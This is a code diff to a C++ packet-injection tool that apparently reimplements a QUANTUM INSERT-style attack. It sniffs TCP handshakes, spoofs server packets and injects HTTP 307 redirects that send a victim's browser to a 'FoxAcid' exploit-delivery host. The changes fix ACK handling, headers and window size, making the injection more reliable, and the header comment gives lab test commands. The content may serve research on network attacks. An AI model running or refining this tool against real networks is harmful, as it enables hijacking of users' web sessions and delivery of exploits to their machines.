@@ -19,7 +19,7 @@
  *
  * Needs to see SYN packets and can be tested on localhost:
  *
- * c++ qi.cc -lusi++ -lpcap -ldnet -o qi
+ * c++ -std=c++11 -I/usr/local/include qi.cc -L/usr/local/lib -lusi++ -lpcap -ldnet -o qi
  * ./qi 2 eth0 192.168.2.253 and also run acid.pl on 192.168.2.253
  * given that you have 2 IPs on your test setup: 192.168.2.x for the
  * client browser connecting, and 192.168.2.253 for FoxAcid to bind to.
@@ -103,6 +103,7 @@ int do_qi2(const string &dev, const string &acid)
 	uint16_t src_port = 0;
 	uint64_t u64 = 0;
 	string redir_base = "HTTP/1.1 307 Moved Permanently\r\n"
+	                    "Content-Length: 0\r\n"
 	                    "Location: http://", redir = "", b64 = "";
 	redir_base += acid;
 	redir_base += "/&";
@@ -132,6 +133,7 @@ int do_qi2(const string &dev, const string &acid)
 	fox_acids[ia.s_addr] = 1;
 
 	snd->set_srcport(80);
+	snd->set_win(8192);
 
 	for (;;) {
 		mon->sniffpack(pkt);
@@ -151,7 +153,7 @@ int do_qi2(const string &dev, const string &acid)
 			continue;
 
 		// track new connection
-		if (mon->get_flags() == TH_SYN) {
+		if (mon->get_flags() == flags::th_syn) {
 			if (mon->get_dstport() != 80)
 				continue;
 			syns[mon->get_seq() + 1] = mon->get_src();
@@ -159,7 +161,7 @@ int do_qi2(const string &dev, const string &acid)
 		}
 
 		// track SYN|ACK to obtain valid SEQ#
-		if (mon->get_flags() == (TH_SYN|TH_ACK)) {
+		if (mon->get_flags() == (flags::th_syn|flags::th_ack)) {
 			if (mon->get_srcport() != 80)
 				continue;
 			u64 = mon->get_dst();
@@ -178,7 +180,6 @@ int do_qi2(const string &dev, const string &acid)
 		if (it->second != mon->get_src())
 			continue;
 
-
 		// was it properly established?
 		u64 = src_ip;
 		u64 <<= 32;
@@ -193,7 +194,8 @@ int do_qi2(const string &dev, const string &acid)
 			continue;
 
 
-		snd->set_flags(TH_PUSH);
+		snd->set_flags(flags::th_push|flags::th_ack);
+		snd->set_ack(mon->get_seq() + pkt.size());
 		snd->set_dst(src_ip);
 		snd->set_src(dst_ip);
 		snd->set_dstport(src_port);
@@ -205,7 +207,7 @@ int do_qi2(const string &dev, const string &acid)
 		snd->sendpack(redir);
 
 		// close connection
-		snd->set_flags(TH_FIN);
+		snd->set_flags(flags::th_fin);
 		snd->set_seq(it2->second + redir.size());
 		snd->sendpack("");
 
@@ -230,6 +232,7 @@ int do_qi1(const string &dev, const string &acid)
 	uint32_t src_ip = 0, dst_ip = 0, seq = 0, start_seq = 0x1000;
 	uint16_t src_port = 0;
 	string redir_base = "HTTP/1.1 307 Moved Permanently\r\n"
+	                    "Content-Length: 0\r\n"
 	                    "Location: http://", redir = "";
 	redir_base += acid;
 	redir_base += "/?";
@@ -252,6 +255,7 @@ int do_qi1(const string &dev, const string &acid)
 	fox_acids[ia.s_addr] = 1;
 
 	snd->set_srcport(80);
+	snd->set_win(8192);
 
 	for (;;) {
 		mon->sniffpack(pkt);
@@ -275,7 +279,7 @@ int do_qi1(const string &dev, const string &acid)
 		dst = mon->get_dst(dst);
 
 		// complete TCP 3way HS
-		snd->set_flags(TH_SYN|TH_ACK);
+		snd->set_flags(flags::th_syn|flags::th_ack);
 		snd->set_dst(src_ip);
 		snd->set_src(dst_ip);
 		snd->set_dstport(src_port);
@@ -284,7 +288,7 @@ int do_qi1(const string &dev, const string &acid)
 		snd->sendpack("");
 
 		// send redirect
-		snd->set_flags(TH_PUSH);
+		snd->set_flags(flags::th_push);
 		snd->set_seq(start_seq + 1);
 		redir = redir_base;
 		redir += dst;
@@ -294,7 +298,7 @@ int do_qi1(const string &dev, const string &acid)
 		// some browsers accept resetted connections (chrome) and handle the redirect input,
 		// some others dont (firefox), so send a FIN.
 		snd->set_seq(start_seq + 1 + redir.size());
-		snd->set_flags(TH_FIN);
+		snd->set_flags(flags::th_fin);
 		snd->sendpack("");
 
 		mission_achieved[src_ip] = 1;
